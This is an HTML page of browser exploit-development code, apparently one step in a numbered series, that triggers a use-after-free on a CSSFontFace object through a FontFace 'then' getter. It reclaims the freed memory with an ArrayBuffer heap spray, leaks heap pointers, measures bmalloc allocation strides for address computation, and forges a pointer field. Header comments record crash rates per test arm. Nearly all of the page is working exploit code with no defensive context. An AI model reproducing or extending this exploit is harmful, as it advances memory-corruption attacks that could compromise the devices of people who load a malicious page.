<!--
  p577: forge one CSSFontFace pointer field and measure whether the engine reads it.

  Built on p563/p565, which reclaim the freed CSSFontFace reliably in their first
  stage.  One line is added to the stage-1 spray -- `v[FOFF] = FVAL` -- and the
  scan watches the *other* pointer, so each load proves its own reclaim before any
  conclusion is drawn.  Liveness beacons at 1 s and 3 s separate a real death from
  a load where the `then` getter never fired (`T1000-nomap`), which the earlier
  pages could not distinguish.

  Arms measured (one load per arm, repeated):

    A  FOFF=0x68 FVAL=0x00 SCAN=0x58   control, 8 of 14 loads reached their beacon
    B  FOFF=0x68 FVAL=0x01 SCAN=0x58   0 of 12
    C  FOFF=0x68 FVAL=0x41 SCAN=0x58   alphanumeric filler
    D  FOFF=0x58 FVAL=0x01 SCAN=0x68   0 of 4

  Writing 1 into +0x68 is exactly as fatal as writing 1 into +0x58, the field that
  is a WeakHashSet impl pointer, so +0x68 is dereferenced rather than read as a
  count.  See docs/FONTFACE_MEMBER_MAP_14_10.md.
-->
<!--
  p565: two-stage FontFace UAF measuring the bmalloc allocation delta between
  consecutive WeakHashSet engine allocations and our reclaim buffer positions.

  Extends p564 to collect the data needed for self-address computation:
  the spatial relationship between leaked engine pointers and our spray ordering.

  Stage 1: Free CSSFontFace, spray 16x 192B buffers, leak P1/P2, record hit index
  Stage 2: Free second CSSFontFace, spray 16x 192B buffers, leak P1'/P2', record hit index

  Key outputs per beacon:
  - Full hex of both leaked qwords (+0x58, +0x68)
  - Hit buffer index within our 16-buffer spray
  - P1 mod 192 (slot alignment in size class)
  - P1 mod 4096 (4KB page offset)
  - Delta P1' - P1 (signed 32-bit, stride between engine allocations)
  - Whether any stage-1 buffer was overwritten by stage-2 engine allocation

  Run across multiple WebProcess relaunches (quit guide, reopen) to measure
  whether the delta and hit indices are stable.

  CRASH_CLASS: LOW — same trigger as p563/p564, no new risk
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p565 bmalloc delta</title>
<script>
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}

var K = 16, SIZE = 192, styleEl = null, firedHere = false, stage = 0;
var FOFF=104, FVAL=0, SCAN=88;
var s1result = null;

function hex8(v, off) {
  var s = '';
  for (var i = 7; i >= 0; i--) s += ('0' + v[off + i].toString(16)).slice(-2);
  return s;
}

function grab(v, off) {
  var a = [];
  for (var i = 0; i < 8; i++) a.push(v[off + i]);
  return a;
}

function lo32(v, off) {
  return (v[off] | (v[off+1] << 8) | (v[off+2] << 16) | ((v[off+3] << 24) >>> 0)) >>> 0;
}

function delta32(raw1, raw2) {
  var v1 = (raw1[0] | (raw1[1] << 8) | (raw1[2] << 16) | ((raw1[3] << 24) >>> 0)) >>> 0;
  var v2 = (raw2[0] | (raw2[1] << 8) | (raw2[2] << 16) | ((raw2[3] << 24) >>> 0)) >>> 0;
  return (v2 - v1) | 0;
}

function setupFace(name, css) {
  styleEl = document.createElement('style');
  styleEl.textContent = css;
  document.head.appendChild(styleEl);
  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(A);
  void A.loaded;
  window.__alive.push(A);
}

function installGetter() {
  firedHere = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function() {
      if (firedHere) return undefined;
      firedHere = true;
      if (styleEl) styleEl.remove();
      try { document.fonts.delete(this); } catch(e) {}
      styleEl = null;
      document.body.offsetHeight;

      var mapKey = '__map' + stage;
      window[mapKey] = [];
      for (var k = 0; k < K; k++) {
        var ab = new ArrayBuffer(SIZE);
        var v = new Uint8Array(ab);
        if (stage === 0) { v[FOFF]=FVAL; }
        /* unique marker at +0x10..+0x12 (engine writes refcount at +0x00,
           pointers at +0x58/+0x68 — these offsets are ours) */
        v[0x10] = 0xBB;
        v[0x11] = stage & 0xFF;
        v[0x12] = k & 0xFF;
        window[mapKey].push(v);
      }
      try { document.fonts.check('1em s' + stage); } catch(e) {}
      return undefined;
    },
    set: function() {}
  });
}

function scanMap(mapKey) {
  var m = window[mapKey] || [];
  for (var i = 0; i < m.length; i++) {
    var v = m[i];
    /* engine writes a heap pointer at +0x58; our buffers have 0 there */
    if (v[SCAN] !== 0 || v[SCAN+1] !== 0 || v[SCAN+2] !== 0 || v[SCAN+3] !== 0) {
      var p58lo = lo32(v, SCAN);
      return {
        hit: i,
        p58: hex8(v, SCAN),
        p68: hex8(v, 0x68),
        p58_raw: grab(v, SCAN),
        p68_raw: grab(v, 0x68),
        mod192: p58lo % 192,
        mod4k:  p58lo % 4096,
        refcount: v[0]
      };
    }
  }
  return null;
}

function start() {
  window.__alive = [];
  stage = 0;
  setupFace('f0', "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }");
  installGetter();
  b('U73A-SETUP');
  document.fonts.load('1em f0, s0', 'AB').then(
    function() { b('U73A-S1-RESOLVED'); },
    function() { b('U73A-S1-REJECTED'); }
  );
  setTimeout(scan1, 80);
  setTimeout(scan1, 250);
  setTimeout(function(){ b('U73A-T1000-' + (window.__map0 ? ('map'+window.__map0.length) : 'nomap')); }, 1000);
  setTimeout(function(){ b('U73A-T3000-alive'); }, 3000);
}

function scan1() {
  if (s1result) return;
  s1result = scanMap('__map0');
  if (!s1result) return;

  b('U73A-S1-b' + s1result.hit
    + '-p58_' + s1result.p58
    + '-p68_' + s1result.p68
    + '-m192_' + s1result.mod192
    + '-m4k_' + s1result.mod4k.toString(16)
    + '-rc_' + s1result.refcount);

  b('U73A-ARM-OFF-104-VAL-0-HIT-b' + s1result.hit);
  b('U73A-ALIVE-AFTER-HIT');
  return;
  stage = 1;
  setupFace('f1', "@font-face { font-family: s1; src: local(Arial); unicode-range: U+0043; }");
  installGetter();
  b('U73A-S2-SETUP');
  document.fonts.load('1em f1, s1', 'AB').then(
    function() { b('U73A-S2-RESOLVED'); },
    function() { b('U73A-S2-REJECTED'); }
  );
  setTimeout(scan2, 80);
  setTimeout(scan2, 250);
}

function scan2() {
  var s2 = scanMap('__map1');
  if (!s2) return;
  /* guard re-entry */
  if (window.__s2done) return;
  window.__s2done = true;

  b('U73A-S2-b' + s2.hit
    + '-p58_' + s2.p58
    + '-p68_' + s2.p68
    + '-m192_' + s2.mod192
    + '-m4k_' + s2.mod4k.toString(16)
    + '-rc_' + s2.refcount);

  /* delta between the two WeakHashSet allocations */
  var d58 = delta32(s1result.p58_raw, s2.p58_raw);
  var d68 = delta32(s1result.p68_raw, s2.p68_raw);
  b('U73A-DELTA-d58_' + d58 + '-d68_' + d68
    + '-bD_' + (s2.hit - s1result.hit)
    + '-stride_' + (d58 / (K + 1)));
  /* d58 / (K+1) is the expected single-object stride if the K spray buffers
     plus 1 CSSFontFace sat between the two WeakHashSet allocations */

  /* check whether stage-2 engine allocation landed in a stage-1 buffer */
  var m0 = window['__map0'] || [];
  var ow = [];
  for (var i = 0; i < m0.length; i++) {
    if (i === s1result.hit) continue;
    var v = m0[i];
    if (v[0x10] !== 0xBB || v[0x11] !== 0 || v[0x12] !== i) {
      var snip = '';
      for (var j = 0; j < 8; j++) snip += ('0' + v[j].toString(16)).slice(-2);
      ow.push('i' + i + ':' + snip);
    }
  }
  b(ow.length ? 'U73A-S1OW-' + ow.join('_') : 'U73A-S1-INTACT-' + (m0.length - 1));

  b('U73A-DONE');
}

function run() { start(); }
if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
else document.addEventListener('DOMContentLoaded', run);
</script></head><body><p>p565 bmalloc delta measurement</p></body></html>
